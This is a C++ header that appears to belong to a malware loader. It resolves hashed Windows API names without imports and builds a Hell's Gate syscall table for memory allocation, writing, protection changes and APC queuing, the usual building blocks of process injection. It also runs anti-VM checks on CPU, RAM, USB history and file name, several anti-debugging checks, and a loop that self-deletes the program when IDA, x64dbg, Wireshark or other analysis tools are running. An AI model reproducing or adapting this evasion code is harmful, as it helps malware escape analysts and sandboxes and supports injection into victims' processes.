#pragma once

#pragma region iat_stuff
constexpr const char* kernel32 = "kernel32.dll";
ct_module_hashing(kernel32)
constexpr const char* ntdll = "ntdll.dll";
ct_module_hashing(ntdll)
constexpr const char* advapi32 = "advapi32.dll";
ct_module_hashing(advapi32)
ct_hashing(CreateProcessA)
ct_hashing(GetEnvironmentVariableA)
ct_hashing(DebugActiveProcessStop)
ct_hashing(IsDebuggerPresent)
ct_hashing(OutputDebugStringA)
ct_hashing(SetLastError)
// native api
ct_hashing(NtAllocateVirtualMemory)
ct_hashing(NtWriteVirtualMemory)
ct_hashing(NtProtectVirtualMemory)
ct_hashing(NtCreateThreadEx)
ct_hashing(NtQueueApcThread)
ct_hashing(NtClose)
ct_hashing(NtQueryInformationProcess)
#pragma endregion iat_stuff

static VX_TABLE vx_table;

class protect : public singleton<protect>
{
	public:
		fnCreateProcessA create_process_a;
		fnGetEnvironmentVariableA get_environment_variable_a;
		fnDebugActiveProcessStop debug_active_process_stop;

		auto run() -> bool
		{
			m_anti_vm();
			process_blacklist_thread = std::thread(&protect::m_blacklist, this);
			anti_debug_thread = std::thread(&protect::m_anti_debug, this);
			printf(AY_OBFUSCATE("* protect header v0.1\n"));

			if (!this->m_vx_table_init())
			{
				printf(AY_OBFUSCATE("- vx table initialisation failed\n"));
				return false;
			}

			printf(AY_OBFUSCATE("+ vx table has been initialised\n"));

			if (!this->m_iat_resolver())
			{
				printf(AY_OBFUSCATE("- iat resolver initialisation failed\n"));
				return false;
			}

			printf(AY_OBFUSCATE("+ iat resolver has been initialised\n"));

			return true;
		}

	private:
		std::thread process_blacklist_thread;
		std::thread anti_debug_thread;
		std::thread anti_vm_thread;

		std::vector<const char*> blacklist_process = 
		{
			AY_OBFUSCATE("ollydbg.exe"),
			AY_OBFUSCATE("processhacker.exe"),
			AY_OBFUSCATE("tcpview.exe"),
			AY_OBFUSCATE("autoruns.exe"),
			AY_OBFUSCATE("filemon.exe"),
			AY_OBFUSCATE("procmon.exe"),
			AY_OBFUSCATE("regmon.exe"),
			AY_OBFUSCATE("procexp.exe"),
			AY_OBFUSCATE("ida.exe"),
			AY_OBFUSCATE("ida64.exe"),
			AY_OBFUSCATE("binaryninja.exe"),
			AY_OBFUSCATE("immunitydebugger.exe"),
			AY_OBFUSCATE("wireshark.exe"),
			AY_OBFUSCATE("dumpcap.exe"),
			AY_OBFUSCATE("hookexplorer.exe"),
			AY_OBFUSCATE("importrec.exe"),
			AY_OBFUSCATE("petools.exe"),
			AY_OBFUSCATE("lordpe.exe"),
			AY_OBFUSCATE("sysinspector.exe"),
			AY_OBFUSCATE("proc_analyzer.exe"),
			AY_OBFUSCATE("sysanalyzer.exe"),
			AY_OBFUSCATE("sniff_hit.exe"),
			AY_OBFUSCATE("windbg.exe"),
			AY_OBFUSCATE("joeboxcontrol.exe"),
			AY_OBFUSCATE("joeboxserver.exe"),
			AY_OBFUSCATE("apimonitor.exe"),
			AY_OBFUSCATE("apimonitor-x86.exe"),
			AY_OBFUSCATE("apimonitor-x64.exe"),
			AY_OBFUSCATE("x32dbg.exe"),
			AY_OBFUSCATE("x64dbg.exe"),
			AY_OBFUSCATE("x96dbg.exe"),
			AY_OBFUSCATE("cheatengine.exe"),
			AY_OBFUSCATE("scylla.exe"),
			AY_OBFUSCATE("charles.exe"),
			AY_OBFUSCATE("proxifier.exe"),
			AY_OBFUSCATE("netmon.exe"),
			AY_OBFUSCATE("cheatengine-x86_64.exe"),
			AY_OBFUSCATE("ReClass.NET.exe")
		};

		auto m_blacklist() -> void
		{
			while (true)
			{
				for (auto& process : this->blacklist_process)
				{
					if (utils::get()->get_procid(process) != 0)
					{
						printf(AY_OBFUSCATE("- process found : %s\n"), process);
						utils::get()->self_delete();
					}
				}

				Sleep(1);
			}	
		}

		auto m_anti_debug() -> void
		{
			NTSTATUS STATUS;
			fnNtQueryInformationProcess	pNtQueryInformationProcess = NULL;
			DWORD64	dwIsDebuggerPresent = NULL;
			DWORD64	hProcessDebugObject = NULL;

			HMODULE hash_kernel32 = m_get_module(my_kernel32);
			HMODULE hash_ntdll = m_get_module(my_ntdll);

			fnIsDebuggerPresent IsDebuggerPresent = (fnIsDebuggerPresent)m_get_proc_address(hash_kernel32, my_IsDebuggerPresent);
			fnOutputDebugStringA OutputDebugStringA = (fnOutputDebugStringA)m_get_proc_address(hash_kernel32, my_OutputDebugStringA);
			fnSetLastError SetLastError = (fnSetLastError)m_get_proc_address(hash_kernel32, my_SetLastError);
			fnNtQueryInformationProcess NtQueryInformationProcess = (fnNtQueryInformationProcess)m_get_proc_address(hash_ntdll, my_NtQueryInformationProcess);

			while (true)
			{
				// anti debug
				if (IsDebuggerPresent())
				{
					printf(AY_OBFUSCATE("- debugger found IsDebuggerPresent\n"));
					utils::get()->self_delete();
				}

				// anti debug outputdebugstring
				SetLastError(1);
				OutputDebugStringA(AY_OBFUSCATE("hello"));
				if (GetLastError() == 0)
				{
					printf(AY_OBFUSCATE("- debugger found OutputDebugStringW\n"));
					utils::get()->self_delete();
				}

				// peb BeingDebugged check
				if (utils::get()->get_peb()->BeingDebugged == 1)
				{
					printf(AY_OBFUSCATE("- debugger found BeingDebugged\n"));
					utils::get()->self_delete();
				}

				// bp check
				CONTEXT	Ctx = { .ContextFlags = CONTEXT_DEBUG_REGISTERS };
				GetThreadContext(GetCurrentThread(), &Ctx);
				if (Ctx.Dr0 != NULL || Ctx.Dr1 != NULL || Ctx.Dr2 != NULL || Ctx.Dr3 != NULL)
				{
					printf(AY_OBFUSCATE("- debugger found anti bp\n"));
					utils::get()->self_delete();
				}


				if (NtQueryInformationProcess == NULL) {
					printf("\n\t[!] GetProcAddress Failed With Error : %d \n", GetLastError());
				}

				STATUS = NtQueryInformationProcess(GetCurrentProcess(), ProcessDebugPort, &dwIsDebuggerPresent, sizeof(DWORD64), NULL);

				if (STATUS != 0x0 && STATUS != 0xC0000353)
					break;
				
				if (dwIsDebuggerPresent != NULL) 
				{
					printf(AY_OBFUSCATE("- debugger found dwIsDebuggerPresent\n"));
					utils::get()->self_delete();
				}

				STATUS = NtQueryInformationProcess(GetCurrentProcess(), (PROCESSINFOCLASS)(((5 * 2) + (25 / 5)) * 2), &hProcessDebugObject, sizeof(DWORD64), NULL);

				if (STATUS != 0x0 && STATUS != 0xC0000353)
					break;

				if (hProcessDebugObject != NULL) 
				{
					printf(AY_OBFUSCATE("- debugger found hProcessDebugObject\n"));
					utils::get()->self_delete();
				}

				Sleep(1);
			}
			
		}

		auto m_anti_vm() -> void
		{
			CHAR Path[MAX_PATH * 3];
			CHAR cName[MAX_PATH];
			DWORD  dwNumberOfDigits = NULL;
			SYSTEM_INFO	SysInfo = { 0 };
			MEMORYSTATUSEX MemStatus = { .dwLength = sizeof(MEMORYSTATUSEX) };
			HKEY hKey = NULL;
			DWORD dwUsbNumber = NULL;

			if (!GetModuleFileNameA(NULL, Path, MAX_PATH * 3))
			{
				printf("\n\t[!] GetModuleFileNameA Failed With Error : %d \n", GetLastError());
			}

			if (lstrlenA(PathFindFileNameA(Path)) < MAX_PATH)
				lstrcpyA(cName, PathFindFileNameA(Path));

			for (int i = 0; i < lstrlenA(cName); i++) 
			{
				if (isdigit(cName[i]))
					dwNumberOfDigits++;
			}

			if (dwNumberOfDigits > 3) 
			{
				printf(AY_OBFUSCATE("- vm detected name\n"));
				utils::get()->self_delete();
			}

			GetSystemInfo(&SysInfo);

			// anti vm cpu check
			if (SysInfo.dwNumberOfProcessors < 2)
			{
				printf(AY_OBFUSCATE("- vm detected cpu\n"));
				utils::get()->self_delete();
			}

			if (!GlobalMemoryStatusEx(&MemStatus))
				return;

			// anti vm ram check
			if ((DWORD)MemStatus.ullTotalPhys < (DWORD)(2 * 1073741824)) 
			{
				printf(AY_OBFUSCATE("- vm detected ram\n"));
				utils::get()->self_delete();
			}

			if ((RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\ControlSet001\\Enum\\USBSTOR", NULL, KEY_READ, &hKey)) != ERROR_SUCCESS)
				return;
			

			if ((RegQueryInfoKeyA(hKey, NULL, NULL, NULL, &dwUsbNumber, NULL, NULL, NULL, NULL, NULL, NULL, NULL)) != ERROR_SUCCESS)
				return;

			if (dwUsbNumber < 2) 
			{
				printf(AY_OBFUSCATE("- vm detected usb\n"));
				utils::get()->self_delete();
			}

			RegCloseKey(hKey);
		}

		auto m_iat_resolver() -> bool
		{
			printf(AY_OBFUSCATE("* iat resolver\n"));

			HMODULE hash_kernel32 = m_get_module(my_kernel32);

			if (hash_kernel32 == NULL)
				return false;

			create_process_a		   = (fnCreateProcessA)m_get_proc_address(hash_kernel32, my_CreateProcessA);
			get_environment_variable_a = (fnGetEnvironmentVariableA)m_get_proc_address(hash_kernel32, my_GetEnvironmentVariableA);
			debug_active_process_stop  = (fnDebugActiveProcessStop)m_get_proc_address(hash_kernel32, my_DebugActiveProcessStop);

			return true;
		}

		auto m_vx_table_init() -> bool
		{
			printf(AY_OBFUSCATE("* vx table\n"));

			PTEB p_teb = utils::get()->get_teb();
			PPEB p_peb = utils::get()->get_peb();

			// ntdll base
			PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)p_peb->Ldr->InMemoryOrderModuleList.Flink->Flink - 0x10);

			// ntdll eat
			PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
			if (!utils::get()->get_eat(pLdrDataEntry->DllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
				return false;

			vx_table.NtAllocateVirtualMemory.dwHash = my_NtAllocateVirtualMemory;
			if (!hellsgate::get()->GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &vx_table.NtAllocateVirtualMemory))
				return false;

			vx_table.NtProtectVirtualMemory.dwHash = my_NtProtectVirtualMemory;
			if (!hellsgate::get()->GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &vx_table.NtProtectVirtualMemory))
				return false;

			vx_table.NtWriteVirtualMemory.dwHash = my_NtWriteVirtualMemory;
			if (!hellsgate::get()->GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &vx_table.NtWriteVirtualMemory))
				return false;

			vx_table.NtQueueApcThread.dwHash = my_NtQueueApcThread;
			if (!hellsgate::get()->GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &vx_table.NtQueueApcThread))
				return false;

			vx_table.NtClose.dwHash = my_NtClose;
			if (!hellsgate::get()->GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &vx_table.NtClose))
				return false;

			return true;
		}

		auto m_get_proc_address(const HMODULE& h_module, DWORD api_hash) -> FARPROC
		{
			if (h_module == NULL || api_hash == NULL)
				return nullptr;

			PBYTE p_base = (PBYTE)h_module;

			PIMAGE_EXPORT_DIRECTORY p_img_export_dir;

			if (!utils::get()->get_eat(p_base, &p_img_export_dir))
				return nullptr;

			auto function_name_array = (PDWORD)(p_base + p_img_export_dir->AddressOfNames);
			auto function_address_array = (PDWORD)(p_base + p_img_export_dir->AddressOfFunctions);
			auto function_ordinal_array = (PWORD)(p_base + p_img_export_dir->AddressOfNameOrdinals);

			for (DWORD i = 0; i < p_img_export_dir->NumberOfFunctions; i++)
			{
				auto p_function_name = (CHAR*)(p_base + function_name_array[i]);
				auto p_function_address = (PVOID)(p_base + function_address_array[function_ordinal_array[i]]);

				if (api_hash == rt_hashing(p_function_name))
				{
					printf(AY_OBFUSCATE("+ function found : %s (0x%0.8X) @ %p\n"), p_function_name, rt_hashing(p_function_name), p_function_address);
					return (FARPROC)p_function_address;
				}
			}

			return nullptr;
		}

		auto m_get_module(DWORD module_hash) -> HMODULE
		{
			if (module_hash == NULL)
				return NULL;

			PPEB pPeb = (utils::get()->get_peb());

			PPEB_LDR_DATA pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);
			PLDR_DATA_TABLE_ENTRY pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);

			while (pDte->FullDllName.Length != NULL && pDte->FullDllName.Length < MAX_PATH)
			{
				std::vector<CHAR> module_name;
				unsigned int i = 0;

				while (pDte->FullDllName.Buffer[i])
				{
					module_name.push_back(static_cast<CHAR>(tolower(pDte->FullDllName.Buffer[i])));
					i++;
				}

				module_name.push_back('\0');

				if (rt_hashing(module_name.data()) == module_hash)
				{
					printf(AY_OBFUSCATE("+ module found : %s (0x%0.8X) @ %p\n"), module_name.data(), rt_hashing(module_name.data()), (HMODULE)pDte->Reserved2[0]);
					return (HMODULE)pDte->Reserved2[0];
				}

				pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);
			}

			return nullptr;
		}
};
